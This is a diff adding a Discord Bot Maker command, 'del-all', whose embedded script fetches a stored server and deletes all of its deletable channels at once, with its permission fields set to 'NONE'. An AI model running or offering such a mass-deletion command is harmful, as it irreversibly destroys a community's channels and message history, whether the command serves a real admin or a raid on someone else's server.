@@ -1,0 +1,27 @@
+{
+  "name": "del-all",
+  "permissions": "NONE",
+  "permissions2": "NONE",
+  "restriction": "1",
+  "_id": "Mpoug",
+  "actions": [
+    {
+      "server": "0",
+      "varName": "",
+      "info": "1",
+      "storage": "1",
+      "varName2": "serverid",
+      "name": "Store Server Info"
+    },
+    {
+      "behavior": "0",
+      "interpretation": "0",
+      "code": "const Discord = require(\"discord.js\");\n\nconst serverId = tempVars(\"serverid\");\n\nasync function DeleteAll(msg) {\n  try {\n    await interaction.reply({\n      content: \"Cleaning process initiated.\",\n      ephemeral: true,\n    });\n\n    const server = await client.guilds.fetch(serverId);\n\n    const handleChannelDeletion = async (channel) => {\n      try {\n        await channel.delete();\n      } catch (error) {\n        const errorMessages = {\n          50013: \"Insufficient permission to delete channels.\",\n          50030: \"Rate limit exceeded. Please wait and try again.\",\n        };\n\n        const errorMessage =\n          errorMessages[error.code] ||\n          \"An error occurred while deleting channels.\";\n        console.error(error);\n        await interaction.reply({\n          content: errorMessage,\n          ephemeral: true,\n        });\n      }\n    };\n\n    const channelsToDelete = server.channels.cache.filter(\n      (channel) => channel.deletable\n    );\n    const channelDeletionPromises = channelsToDelete.map(handleChannelDeletion);\n\n    await Promise.all(channelDeletionPromises);\n\n    Actions.callNextAction(cache);\n  } catch (error) {\n    console.error(error);\n    await interaction.reply({\n      content: \"An error occurred during the cleaning process.\",\n      ephemeral: true,\n    });\n  }\n}\n\nDeleteAll(msg);",
+      "storage": "0",
+      "varName": "",
+      "name": "Run Script"
+    }
+  ],
+  "comType": "4",
+  "description": "delete all channels"
+}
